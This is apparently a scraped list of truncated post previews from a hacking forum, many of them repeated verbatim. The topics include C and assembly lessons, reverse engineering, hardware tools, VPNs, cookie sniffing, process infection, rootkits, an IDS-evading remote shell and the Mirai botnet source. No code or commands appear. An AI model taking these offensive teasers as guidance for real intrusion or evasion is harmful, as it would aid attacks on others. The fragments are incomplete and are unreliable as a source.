MIPS code in there. Actually, the paper was already quite long and, to be honest, I tho&hellip;", "Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring &hellip;", "It is KB. You can also use just K or KiB, but no kb or Kb. It matters because 65536 and 64000 are different numbers and 1 __B__yte is 8 __b__its .", "I only saw this recently, but I will definitely add this to my EDC:", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Hi fellas, The time is came to publish the first release of unDLP. This journey was scattered of obstacles coming from the old and venerated Perl gods ! But that\u2019s not all, hold on, the famous TLS protocol  made me sweated more than once \u2026 bloody block size limitation \u2026  Well, before I get into th&hellip;", "It is KB. You can also use just K or KiB, but no kb or Kb. It matters because 65536 and 64000 are different numbers and 1 __B__yte is 8 __b__its .", "It is KB. You can also use just K or KiB, but no kb or Kb. It matters because 65536 and 64000 are different numbers and 1 __B__yte is 8 __b__its .", "It is KB. You can also use just K or KiB, but no kb or Kb. It matters because 65536 and 64000 are different numbers and 1 __B__yte is 8 __b__its .", "It is KB. You can also use just K or KiB, but no kb or Kb. It matters because 65536 and 64000 are different numbers and 1 __B__yte is 8 __b__its .", "It is KB. You can also use just K or KiB, but no kb or Kb. It matters because 65536 and 64000 are different numbers and 1 __B__yte is 8 __b__its .", "It is KB. You can also use just K or KiB, but no kb or Kb. It matters because 65536 and 64000 are different numbers and 1 __B__yte is 8 __b__its .", "[image]I\u2019m a little confused  Should it be kb, Kb or KB? Should this even matter?", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "This is awesome! thanks man!", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Thanks!. Beginners are the future", "I did. Thanks for telling us how to do it with Arch", "The reply arrow doesn\u2019t show up when the comment to which you\u2019re replying is the one right above.", "The reply arrow doesn\u2019t show up when the comment to which you\u2019re replying is the one right above.", "The reply arrow doesn\u2019t show up when the comment to which you\u2019re replying is the one right above.", "I did. Thanks for telling us how to do it with Arch", "I did. Thanks for telling us how to do it with Arch", "Oh\u2026 I see. Sometime it also happen to me\u2026 the reply arrow not showing up\u2026", "Oops, I did read that part.  I was replying to @boinclement btw. Dunno why that little reply arrow thingy didn\u2019t show up.", "I did. Thanks for telling us how to do it with Arch", "Oops, I did read that part.  I was replying to @boinclement btw. Dunno why that little reply arrow thingy didn\u2019t show up.", "I did. Thanks for telling us how to do it with Arch", "You should also make sure to specify what distro you\u2019re using. Most of those build essentials are in the base and base-devel group on Arch, for an example. pacman -Sg base-devel lists the pckages in that group.", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "That\u2019s great!, it is what I was thinking about.", "Thanks @boinclement. Let me know if the update works for you", "Wanted to have a little refresher on shells in C and I\u2019d like to make some notes in case someone didn\u2019t fully understand why the shell works. When execv was called: The caller\u2019s memory image was overwritten by the new one. The file table stayed in place. Meaning, open file descriptors are pre&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Thanks @boinclement. Let me know if the update works for you", "Thank you, really nice tuto  What would you think to add a few lines on how to install the required tools ? Regards,", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring &hellip;", "Continuing the discussion from [KEYGENME - EASY] Cracking Your First Program: As requested by @pry0cc, this is a crash course on reverse engineering. Before reading this, you should try to solve @dtm challenge: If you didn\u2019t manage or you want to see somebody else solution keep reading. Our Tar&hellip;", "Not sure which .hex files are you referring to. Anyway, .hex is usually the extension of Intel hex files. A format to encode binary data in ASCII and used by many tools as source or target format for firmware write/read. In this context, they contain firmware dumps. avrdude (used by the Arduino env&hellip;", "Not sure which .hex files are you referring to. Anyway, .hex is usually the extension of Intel hex files. A format to encode binary data in ASCII and used by many tools as source or target format for firmware write/read. In this context, they contain firmware dumps. avrdude (used by the Arduino env&hellip;", "Since I\u2019ve noticed quite a lot of interest in low-level stuff from the community recently, especially on IRC when it comes to reversing/exploit dev, below you\u2019ll find some pwning/reversing challenges that I\u2019ve enjoyed playing over the past months. Note: I won\u2019t be referring to the ones everyone is &hellip;", "Since I\u2019ve noticed quite a lot of interest in low-level stuff from the community recently, especially on IRC when it comes to reversing/exploit dev, below you\u2019ll find some pwning/reversing challenges that I\u2019ve enjoyed playing over the past months. Note: I won\u2019t be referring to the ones everyone is &hellip;", "Not sure which .hex files are you referring to. Anyway, .hex is usually the extension of Intel hex files. A format to encode binary data in ASCII and used by many tools as source or target format for firmware write/read. In this context, they contain firmware dumps. avrdude (used by the Arduino env&hellip;", "Not sure which .hex files are you referring to. Anyway, .hex is usually the extension of Intel hex files. A format to encode binary data in ASCII and used by many tools as source or target format for firmware write/read. In this context, they contain firmware dumps. avrdude (used by the Arduino env&hellip;", "When I started studying and learning about exploit development, one of the biggest issues I ran in to was finding a good starting point. I am by no means an expert in this field, but here is a list of some of the material I found helpful while learning (I still am learning and will always be) to res&hellip;", "I\u2019ll just leave that here, because - you know - it\u2019s great . @0x00pf\u2019s Reverse Engineering 101", "Not sure which .hex files are you referring to. Anyway, .hex is usually the extension of Intel hex files. A format to encode binary data in ASCII and used by many tools as source or target format for firmware write/read. In this context, they contain firmware dumps. avrdude (used by the Arduino env&hellip;", "Not sure which .hex files are you referring to. Anyway, .hex is usually the extension of Intel hex files. A format to encode binary data in ASCII and used by many tools as source or target format for firmware write/read. In this context, they contain firmware dumps. avrdude (used by the Arduino env&hellip;", "Continuing the discussion from Plug In To Win - DIY Bad USB [Part 3/3]: You may have read the awesome \u201cPlug In To Win\u201d series from @TheDoctor. It make me recall some experiments I did time ago on HID injection. After some private chat, we agreed to release this extra post to present one more HW alt&hellip;", "@Valkyr Do you know anything about those .HEX files? I\u2019m confused as to how they are being used by the teensy loader. Maybe @0x00pf can shed some light into this.", "In this last part of this series, we are going to see how to build a pretty stealth remote shell. This remote shell usually also have better chances to avoid detection systems like firewalls and IDS. As described above, it sounds like the definitely remote access tool. Doesn\u2019t it?. Well, actually s&hellip;", "In this last part of this series, we are going to see how to build a pretty stealth remote shell. This remote shell usually also have better chances to avoid detection systems like firewalls and IDS. As described above, it sounds like the definitely remote access tool. Doesn\u2019t it?. Well, actually s&hellip;", "Thank you for the input!  I always appreciate criticism and additions, as it makes for a better writer. I was primarily focusing on the Arduino Uno. I didn\u2019t think I could do a better job than the wikipedia article, I simply wrote this article for the sake of completion of the series and didn\u2019t &hellip;", "Thank you for the input!  I always appreciate criticism and additions, as it makes for a better writer. I was primarily focusing on the Arduino Uno. I didn\u2019t think I could do a better job than the wikipedia article, I simply wrote this article for the sake of completion of the series and didn\u2019t &hellip;", "There are almost 20 official Arduino models with very different features (not considering all the tenths of compatible boards out there). Some have removable MCUs, some don\u2019t. Some have more memory, some less. Some run faster and some slower\u2026 The language you use with the Arduino IDE is also C.&hellip;", "There are almost 20 official Arduino models with very different features (not considering all the tenths of compatible boards out there). Some have removable MCUs, some don\u2019t. Some have more memory, some less. Some run faster and some slower\u2026 The language you use with the Arduino IDE is also C.&hellip;", "There are almost 20 official Arduino models with very different features (not considering all the tenths of compatible boards out there). Some have removable MCUs, some don\u2019t. Some have more memory, some less. Some run faster and some slower\u2026 The language you use with the Arduino IDE is also C.&hellip;", "There are almost 20 official Arduino models with very different features (not considering all the tenths of compatible boards out there). Some have removable MCUs, some don\u2019t. Some have more memory, some less. Some run faster and some slower\u2026 The language you use with the Arduino IDE is also C.&hellip;", "There are almost 20 official Arduino models with very different features (not considering all the tenths of compatible boards out there). Some have removable MCUs, some don\u2019t. Some have more memory, some less. Some run faster and some slower\u2026 The language you use with the Arduino IDE is also C.&hellip;", "There are almost 20 official Arduino models with very different features (not considering all the tenths of compatible boards out there). Some have removable MCUs, some don\u2019t. Some have more memory, some less. Some run faster and some slower\u2026 The language you use with the Arduino IDE is also C.&hellip;", "There are almost 20 official Arduino models with very different features (not considering all the tenths of compatible boards out there). Some have removable MCUs, some don\u2019t. Some have more memory, some less. Some run faster and some slower\u2026 The language you use with the Arduino IDE is also C.&hellip;", "There are almost 20 official Arduino models with very different features (not considering all the tenths of compatible boards out there). Some have removable MCUs, some don\u2019t. Some have more memory, some less. Some run faster and some slower\u2026 The language you use with the Arduino IDE is also C.&hellip;", "There are almost 20 official Arduino models with very different features (not considering all the tenths of compatible boards out there). Some have removable MCUs, some don\u2019t. Some have more memory, some less. Some run faster and some slower\u2026 The language you use with the Arduino IDE is also C.&hellip;", "There are almost 20 official Arduino models with very different features (not considering all the tenths of compatible boards out there). Some have removable MCUs, some don\u2019t. Some have more memory, some less. Some run faster and some slower\u2026 The language you use with the Arduino IDE is also C.&hellip;", "Hi @ricksanchez Good introduction. Some comments Even when I think, most of the people had understood what you meant in that sentence I would like to clarify that a logic analyser is intended to be used with digital signals. It will not work with analogue signals. The \u201cwhatever form the signal ma&hellip;", "Hi @ricksanchez Good introduction. Some comments Even when I think, most of the people had understood what you meant in that sentence I would like to clarify that a logic analyser is intended to be used with digital signals. It will not work with analogue signals. The \u201cwhatever form the signal ma&hellip;", "True but on the other hand I thought we\u2019re dealing here with humans capable of thinking and reading   Anyways I get your point. These are way too big and look like a freaking microwave. But okay I get why they might be needed.", "Hi @ricksanchez Good introduction. Some comments Even when I think, most of the people had understood what you meant in that sentence I would like to clarify that a logic analyser is intended to be used with digital signals. It will not work with analogue signals. The \u201cwhatever form the signal ma&hellip;", "Hi @ricksanchez Good introduction. Some comments Even when I think, most of the people had understood what you meant in that sentence I would like to clarify that a logic analyser is intended to be used with digital signals. It will not work with analogue signals. The \u201cwhatever form the signal ma&hellip;", "True but on the other hand I thought we\u2019re dealing here with humans capable of thinking and reading   Anyways I get your point. These are way too big and look like a freaking microwave. But okay I get why they might be needed.", "In all honesty, do not be disappointed. It is very good that somebody is push the hardware hacking area in the community. I see it as a key set of skills for hacking, at least for what hacking means to me  Reading your post is clear you have done the stuff and you know what you are talking about. E&hellip;", "you\u2019re absolutely correct with the signal having to be digital. I will edit the post above so it won\u2019t deliver false information. For the stand alone logic analyzers. There might be some, I\u2019ve never seen one or used one though, maybe too young or not working in the correct environment  who knows  . &hellip;", "In all honesty, do not be disappointed. It is very good that somebody is push the hardware hacking area in the community. I see it as a key set of skills for hacking, at least for what hacking means to me  Reading your post is clear you have done the stuff and you know what you are talking about. E&hellip;", "Hi @ricksanchez Good introduction. Some comments Even when I think, most of the people had understood what you meant in that sentence I would like to clarify that a logic analyser is intended to be used with digital signals. It will not work with analogue signals. The \u201cwhatever form the signal ma&hellip;", "you\u2019re absolutely correct with the signal having to be digital. I will edit the post above so it won\u2019t deliver false information. For the stand alone logic analyzers. There might be some, I\u2019ve never seen one or used one though, maybe too young or not working in the correct environment  who knows  . &hellip;", "Hi @ricksanchez Good introduction. Some comments Even when I think, most of the people had understood what you meant in that sentence I would like to clarify that a logic analyser is intended to be used with digital signals. It will not work with analogue signals. The \u201cwhatever form the signal ma&hellip;", "Hi @ricksanchez Good introduction. Some comments Even when I think, most of the people had understood what you meant in that sentence I would like to clarify that a logic analyser is intended to be used with digital signals. It will not work with analogue signals. The \u201cwhatever form the signal ma&hellip;", "It might be already planned for the future but I just want to say it either way in case it\u2019s not. These hardware gadget write-ups that you guys have been posting lately are cool indeed. But something is missing. A demo. I\u2019d assume that these sort of posts want to attract the readers in order to get&hellip;", "Continuing the discussion from Plug In To Win - DIY Bad USB [Part 3/3]: You may have read the awesome \u201cPlug In To Win\u201d series from @TheDoctor. It make me recall some experiments I did time ago on HID injection. After some private chat, we agreed to release this extra post to present one more HW alt&hellip;", "@pry0cc google teensy + CAN (Controller Area Network). Teensy 3.1/3.2 has a CAN bus", "@Valkyr fully agree with @_py. The LC (Low Cost) is a lot cheaper and enough for most of the things mentioned in this post. The 3.X series are pretty powerful (Cortex M-4). Unless you want to do some real-time stuff (audio processing for instance), you will be wasting resources", "Get the LC one. It will get the job done and it\u2019s cheaper than the rest.", "I just thought I\u2019d point out this article by @0x00pf", "I just thought I\u2019d point out this article by @0x00pf", "Continuing the discussion from [KEYGENME - EASY] Cracking Your First Program: As requested by @pry0cc, this is a crash course on reverse engineering. Before reading this, you should try to solve @dtm challenge: If you didn\u2019t manage or you want to see somebody else solution keep reading. Our Tar&hellip;", "Good choice for starting the series @ricksanchez I personally haven\u2019t got a bus pirate. I was considering buying one, but for most of the stuff I do, I can go with a Rpi or my beloved BeableBone and bit-banging interfaces in worst case. Your both article proposals sounds good\u2026 I guess that, at lea&hellip;", "Good choice for starting the series @ricksanchez I personally haven\u2019t got a bus pirate. I was considering buying one, but for most of the stuff I do, I can go with a Rpi or my beloved BeableBone and bit-banging interfaces in worst case. Your both article proposals sounds good\u2026 I guess that, at lea&hellip;", "@VVid0w looks like the typical USB to Serial-TTL adapter. Just plug it in your computer and the other end to a serial port, fire minicom and there you go (it is probably Serial TTL so it may be 3.3V or 5V\u2026 do not plug it into a 12V RS-232C )", "Oh, alright! Thank you! I\u2019ll definitely be opening up some gadgets in my house to see what I can find now.", "@VVid0w looks like the typical USB to Serial-TTL adapter. Just plug it in your computer and the other end to a serial port, fire minicom and there you go (it is probably Serial TTL so it may be 3.3V or 5V\u2026 do not plug it into a 12V RS-232C )", "@VVid0w looks like the typical USB to Serial-TTL adapter. Just plug it in your computer and the other end to a serial port, fire minicom and there you go (it is probably Serial TTL so it may be 3.3V or 5V\u2026 do not plug it into a 12V RS-232C )", "@Evalion  sure an article about a multimeter and oscilloscope could follow too! At least some basics on why have them and what are they used for. I\u2019ll check out the \u201cPICKit2\u201d because it doesn\u2019t ring a bell right now. @0x00pf Thanks. Sure if you have other use cases where you already have appropriat&hellip;", "@Evalion  sure an article about a multimeter and oscilloscope could follow too! At least some basics on why have them and what are they used for. I\u2019ll check out the \u201cPICKit2\u201d because it doesn\u2019t ring a bell right now. @0x00pf Thanks. Sure if you have other use cases where you already have appropriat&hellip;", "Good choice for starting the series @ricksanchez I personally haven\u2019t got a bus pirate. I was considering buying one, but for most of the stuff I do, I can go with a Rpi or my beloved BeableBone and bit-banging interfaces in worst case. Your both article proposals sounds good\u2026 I guess that, at lea&hellip;", "Cheers mate Always a relevant comment ! I will fix that. Thanks for sharing.", "Intro to the Hackers labAs asked in the The Hackers lab - Rpi Edition  by @VVid0w, he and I will now collaborate when writing this series about hardware and essentials a hacker should have to solve the task efficiently Today with a 100% fresh portion about debugging/reversing What is a Bus Pirat&hellip;", "The main benefit is that Perl is the coolest scripting language ever  On top of that, it is very easy to integrate a Perl interpreter in any other project and it has a quite powerful extension system to interface to any other library out there (man perlembed  and man perlxstut for details). P.S.: &hellip;", "Cheers mate Always a relevant comment ! I will fix that. Thanks for sharing.", "The main benefit is that Perl is the coolest scripting language ever  On top of that, it is very easy to integrate a Perl interpreter in any other project and it has a quite powerful extension system to interface to any other library out there (man perlembed  and man perlxstut for details). P.S.: &hellip;", "Interesting to learn about the naming difference . Had never heard of that before", "The main benefit is that Perl is the coolest scripting language ever  On top of that, it is very easy to integrate a Perl interpreter in any other project and it has a quite powerful extension system to interface to any other library out there (man perlembed  and man perlxstut for details). P.S.: &hellip;", "Interesting to learn about the naming difference . Had never heard of that before", "The main benefit is that Perl is the coolest scripting language ever  On top of that, it is very easy to integrate a Perl interpreter in any other project and it has a quite powerful extension system to interface to any other library out there (man perlembed  and man perlxstut for details). P.S.: &hellip;", "The main benefit is that Perl is the coolest scripting language ever  On top of that, it is very easy to integrate a Perl interpreter in any other project and it has a quite powerful extension system to interface to any other library out there (man perlembed  and man perlxstut for details). P.S.: &hellip;", "What are the benefits of Perl over C++? I think it would be easier to integrate/port into existing projects if you write it in C++, wouldn\u2019t it? Best, SmartOne P.S.: I could be wrong though, because I don\u2019t have a lot of experience with Perl", "Hi fellas, As @_py suggested, I have decided to adopt a new article format to show the progress of my project, allowing you to have a better understanding of the technical choices during the development process as well as a better overview of the work accomplished. This new series concerns a new o&hellip;", "The delta offset method is required for situations where you cannot determine where your values will exist in the virtual memory space of the process (or host) since there are some dynamic elements such as the innate differences of files, base relocations, etc. Is that what you were looking for or &hellip;", "In this paper I will present an elegant technique (it\u2019s my opinion, indeed) to get shell access to a vulnerable remote machine. It is not my own technique but I found it very interesting. The focus of this paper is on this technique and not in the way to exploit the vulnerability. Setting your envi&hellip;", "I promise to write this many months ago, and finally I found some time to do it. Even when a VPN is not really a hacker tool, it is commonly used to make tracing more difficult and to increase privacy and anonymity. We have talked a lot about VPNs from a user point of view but not much about how the&hellip;", "This tutorial was wonderfully informative! And I found myself understanding most of it.", "I promise to write this many months ago, and finally I found some time to do it. Even when a VPN is not really a hacker tool, it is commonly used to make tracing more difficult and to increase privacy and anonymity. We have talked a lot about VPNs from a user point of view but not much about how the&hellip;", "That\u2019s correct. However you may have to carefully adjust your timeouts for some of those transport techniques. The paper planes solution may suppose some serious technical challenges . For the pigeons the process is already standardised: https://tools.ietf.org/html/rfc2549 Regarding DNS\u2026 I really&hellip;", "Hi @Duke_Nukem, In this context, you can consider the placeholder as a \u201cfake\u201d virtual address that will later be replaced by the real one. That\u2019s because you don\u2019t know where the MessageBoxA function will be located in the virtual address space of the target process. The same applies for the entry&hellip;", "That\u2019s correct. However you may have to carefully adjust your timeouts for some of those transport techniques. The paper planes solution may suppose some serious technical challenges . For the pigeons the process is already standardised: https://tools.ietf.org/html/rfc2549 Regarding DNS\u2026 I really&hellip;", "Fun fact, you can use anything to transport your packets! So you can use ICMP, DNS queries, pipes between processes, infrared diodes and sensors, printer which prints them out then feeds the paper into a scanner, then an OCR program reads them again, machines that fold the paper into airplanes and s&hellip;", "I promise to write this many months ago, and finally I found some time to do it. Even when a VPN is not really a hacker tool, it is commonly used to make tracing more difficult and to increase privacy and anonymity. We have talked a lot about VPNs from a user point of view but not much about how the&hellip;", "I promise to write this many months ago, and finally I found some time to do it. Even when a VPN is not really a hacker tool, it is commonly used to make tracing more difficult and to increase privacy and anonymity. We have talked a lot about VPNs from a user point of view but not much about how the&hellip;", "I promise to write this many months ago, and finally I found some time to do it. Even when a VPN is not really a hacker tool, it is commonly used to make tracing more difficult and to increase privacy and anonymity. We have talked a lot about VPNs from a user point of view but not much about how the&hellip;", "I promise to write this many months ago, and finally I found some time to do it. Even when a VPN is not really a hacker tool, it is commonly used to make tracing more difficult and to increase privacy and anonymity. We have talked a lot about VPNs from a user point of view but not much about how the&hellip;", "I promise to write this many months ago, and finally I found some time to do it. Even when a VPN is not really a hacker tool, it is commonly used to make tracing more difficult and to increase privacy and anonymity. We have talked a lot about VPNs from a user point of view but not much about how the&hellip;", "I promise to write this many months ago, and finally I found some time to do it. Even when a VPN is not really a hacker tool, it is commonly used to make tracing more difficult and to increase privacy and anonymity. We have talked a lot about VPNs from a user point of view but not much about how the&hellip;", "I promise to write this many months ago, and finally I found some time to do it. Even when a VPN is not really a hacker tool, it is commonly used to make tracing more difficult and to increase privacy and anonymity. We have talked a lot about VPNs from a user point of view but not much about how the&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Thank you very much for you response! You are actually right, I\u2019m mixing 32bit and 64bit. I\u2019ll take a look at these articles", "Thank you very much for you response! You are actually right, I\u2019m mixing 32bit and 64bit. I\u2019ll take a look at these articles", "Hi @p3rla, Thanks for following the tutorial and for your feedback.I have seen that happening some time ago. As far as I remember it  happens when you mix up 32bits and 64bits code. In those cases you need to do some extra work to invoke the system call. I\u2019m not sure if I took notes from those test&hellip;", "You no doubt have heard of Cookie Sniffing before. You sniff out a cookie, and you have their session, right? Sounds easy. Firesheep made it incredibly easy, and you can do this easily with things like MiTMF or STELF. But what exactly are cookies, how do they work, and how can we exploit them? Let\u2019&hellip;", "Hi fellas, First of all, I wanted to apologize for my lack of activities the last month. Indeed, I was overwhelmed by my work and my training for my OSCP certification which was quite time consuming  By the same token, would you be interested in my feedback about OSCP? YesNo0voters &hellip;", "Continuing the discussion from [KEYGENME - EASY] Cracking Your First Program: As requested by @pry0cc, this is a crash course on reverse engineering. Before reading this, you should try to solve @dtm challenge: If you didn\u2019t manage or you want to see somebody else solution keep reading. Our Tar&hellip;", "Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel modul&hellip;", "At some point, your C program is gonna grow. Maintaining all that code in just one file is painful. Even more, you may be using different libraries and typing all those flags every time you want to compile your program also becomes painful. When you get to that point, is time to Make and Split. Hel&hellip;", "Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring &hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "In this paper I will present an elegant technique (it\u2019s my opinion, indeed) to get shell access to a vulnerable remote machine. It is not my own technique but I found it very interesting. The focus of this paper is on this technique and not in the way to exploit the vulnerability. Setting your envi&hellip;", "Continuing the discussion from [KEYGENME - EASY] Cracking Your First Program: As requested by @pry0cc, this is a crash course on reverse engineering. Before reading this, you should try to solve @dtm challenge: If you didn\u2019t manage or you want to see somebody else solution keep reading. Our Tar&hellip;", "@pry0cc All the classical stuff. Anti-debug techniques: auto-trace, auto-checksums, jump in the middle of instructions, crypters/packers, VMs,\u2026 @_py  You can do that with dynamically linked programs. With static ones you get most of that information actually gone (specially with sstrip). As there &hellip;", "@0x00pf Every symbol\u2019s string name can be found either in .dynstr or .strtab I believe. Your point about static binaries can be valid if the (s)strip command does strip those tables as well. I\u2019ll code a quick lil parser and check it out.", "@_py that will be cool. I\u2019ll love to see that parser\u2026", "@0x00pf Every symbol\u2019s string name can be found either in .dynstr or .strtab I believe. Your point about static binaries can be valid if the (s)strip command does strip those tables as well. I\u2019ll code a quick lil parser and check it out.", "Hey @0x00pf very nice tutorial. For those who want to try a few more exercises here for more info: http://pwnable.kr/ Exercises list: http://pwnable.kr/play.php", "Hey @0x00pf very nice tutorial. For those who want to try a few more exercises here for more info: http://pwnable.kr/ Exercises list: http://pwnable.kr/play.php", "@pry0cc All the classical stuff. Anti-debug techniques: auto-trace, auto-checksums, jump in the middle of instructions, crypters/packers, VMs,\u2026 @_py  You can do that with dynamically linked programs. With static ones you get most of that information actually gone (specially with sstrip). As there &hellip;", "Man this article has a lot of viwss", "I\u2019ll just leave this here\u2026 https://git.0x00sec.org/JSchmoe/unnamed-shell", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "Continuing the discussion from Remote Exploit. Shellcode without Sockets: No this is not a log post on how to hack remote services. By chance I found an interesting paper that presents an interesting technique to hack your way into a remote server without having a local binary. This is the link h&hellip;", "Continuing the discussion from Remote Exploit. Shellcode without Sockets: No this is not a log post on how to hack remote services. By chance I found an interesting paper that presents an interesting technique to hack your way into a remote server without having a local binary. This is the link h&hellip;", "I wish I could take the credit. But I\u2019m not a complete dick. It was 100% @_py\u2019s suggestion for this write-up and the name.  I just, you know, did the work", "Continuing the discussion from Remote Exploit. Shellcode without Sockets: No this is not a log post on how to hack remote services. By chance I found an interesting paper that presents an interesting technique to hack your way into a remote server without having a local binary. This is the link h&hellip;", "Wow, the article is full of brilliant ideas\u2026 Thanks pico!", "Continuing the discussion from Remote Exploit. Shellcode without Sockets: No this is not a log post on how to hack remote services. By chance I found an interesting paper that presents an interesting technique to hack your way into a remote server without having a local binary. This is the link h&hellip;", "Continuing the discussion from Remote Exploit. Shellcode without Sockets: No this is not a log post on how to hack remote services. By chance I found an interesting paper that presents an interesting technique to hack your way into a remote server without having a local binary. This is the link h&hellip;", "Continuing the discussion from Remote Exploit. Shellcode without Sockets: No this is not a log post on how to hack remote services. By chance I found an interesting paper that presents an interesting technique to hack your way into a remote server without having a local binary. This is the link h&hellip;", "Continuing the discussion from Remote Exploit. Shellcode without Sockets: No this is not a log post on how to hack remote services. By chance I found an interesting paper that presents an interesting technique to hack your way into a remote server without having a local binary. This is the link h&hellip;", "Continuing the discussion from Remote Exploit. Shellcode without Sockets: No this is not a log post on how to hack remote services. By chance I found an interesting paper that presents an interesting technique to hack your way into a remote server without having a local binary. This is the link h&hellip;", "Continuing the discussion from Remote Exploit. Shellcode without Sockets: No this is not a log post on how to hack remote services. By chance I found an interesting paper that presents an interesting technique to hack your way into a remote server without having a local binary. This is the link h&hellip;", "Dynamic Loading of Shared Objects at RuntimeI\u2019ve been doing a lot of tutorials about dynamic stuff. It\u2019s because we trees rustle whenever the wind blows. Anyway, this post comes as an addition to @_py\u2019s Linux Internals - The Art Of Symbol Resolution. This whole thing started when I decided that t&hellip;", "Picture the moment. It\u2019s 2057, technology has barely progressed, and the earth is under harsh censorship and surveillance. Humanity has reverted to the Hitler days. Don\u2019t get depressed! Let\u2019s build a mesh net! In your manic mindset, you quickly throw together your portable phone re-charger, your R&hellip;", "Sounds like an interesting project to learn about a lot of topics!. Let\u2019s try", "Sounds like an interesting project to learn about a lot of topics!. Let\u2019s try", "@oaktree: You are right. This is just an implementation. Surely you can create your own, but you have to be hardcore as you can see. I mean, just look at the detail and precision. This is no game. Just imagine this: Creating a malware with your own compiler and linker. Scary man.", "Wow. A lot more goes into this than I\u2019d thought. I guess I\u2019ve been taking it all for granted\u2026 Sooo the assembly stuff is just some standard, right? Because there are probably other ways to do symbol resolution if you wanted to and you wrote your own compiler. Right?", "Sounds like an interesting project to learn about a lot of topics!. Let\u2019s try", "Sounds like an interesting project to learn about a lot of topics!. Let\u2019s try", "Hello peeps! Been a while. I hope you\u2019re all doing great. This write-up was supposed to be up way sooner to be honest. Recently, @oaktree coded an IRC bot with dynamic linking features which motivated me to finally take the initiative and finish this god damn paper. So without further ado, @oaktree &hellip;", "Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel modul&hellip;", "Pico the wizard.  You did it again. Nice share duuude.  Rootkits to the moon! I think its time to write a rookit with a RAT eh?", "Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel modul&hellip;", "Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel modul&hellip;", "Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel modul&hellip;", "Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel modul&hellip;", "Two down; one to go!!!", "I know this is probably a really basic thing, but it\u2019s still awesome! Thanks for sharing.", "Two down; one to go!!!", "Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel modul&hellip;", "Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel modul&hellip;", "Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel modul&hellip;", "Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel modul&hellip;", "I\u2019ve been doing some thinking about DNS Rebinding, and I think this could be really insightful to a lot of you out there. I found this a while ago, (Def Con rocks), and he is speaking about bypassing Same Origin Policy in order to execute code on machine on your local network using DNS Rebinding. I&hellip;", "I guess you have heard about the Mirai BotNet. Everybody was talking about it because of some massive DDoS from IoT devices. Then, early this month, its source code was released: Finally, I manage to take a look to the source code and\u2026 there is a lot of interesting stuff in there!!! Take a look &hellip;", "And the winner is\u2026 @dtm! Congrats. @dtm previously won the old 1337 of the w33k and has contributed many h4rdc0r3 articles about h4x0rzing all sorts of stuff! @IoTh1nkN0t@0x00pf@pry0cc@Joe_Schmoe@Cal0X@dtm@TxS0voters Show resultsHello Loyal 0x00ers! For this month we are op&hellip;", "What\u2019s good, peeps? Before I start this topic, I\u2019d like to sincerely apologise for the huge delay. At the time (before my exams started), 